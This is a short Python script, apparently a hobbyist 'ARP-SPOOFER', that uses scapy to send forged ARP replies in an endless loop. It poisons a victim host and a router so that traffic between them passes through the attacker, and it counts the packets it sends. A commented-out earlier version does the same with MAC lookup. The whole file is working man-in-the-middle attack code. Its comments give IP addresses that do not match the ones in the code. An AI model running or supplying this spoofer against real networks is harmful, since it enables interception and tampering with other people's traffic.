# #!/usr/bin/env python

# import scapy.all as scapy
# import time
#
# while True:
#     def get_mac(ip):
#         arp_request = scapy.ARP(pdst=ip)
#         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#         arp_request_broadcast = broadcast/arp_request
#         answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
#         return answered_list[0][1].hwsrc
#
#
#
#     def spoof(target_ip, spoof_ip):
#         target_mac = get_mac(target_ip)
#         packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
#         scapy.send(packet)
#
#     while True:
#         spoof("192.168.1.8","192.168.1.1")
#         spoof("192.168.1.1","192.168.1.8")
#







import scapy.all as scap
import sys
set_packet_count=0
try:
    while True:
        packet = scap.ARP(op=2, pdst="192.168.1.8", hwsrc="20:e8:17:06:6d:92 ", psrc="192.168.1.1")
        scap.send(packet,verbose=False) #Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.
        packet = scap.ARP(op=2, pdst="192.168.1.1", hwsrc="0c:d2:b5:a7:8b:eb", psrc="192.168.1.8")
        scap.send(packet,verbose=False) #Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim.
        set_packet_count = set_packet_count + 2
        print("\r[+]PACKETS SENT:" + str(set_packet_count)),
        sys.stdout.flush()
except KeyboardInterrupt:
    print("\n[+]QUITTING..THANKS FOR USING ANURAG'S ARP-SPOOFER..\n")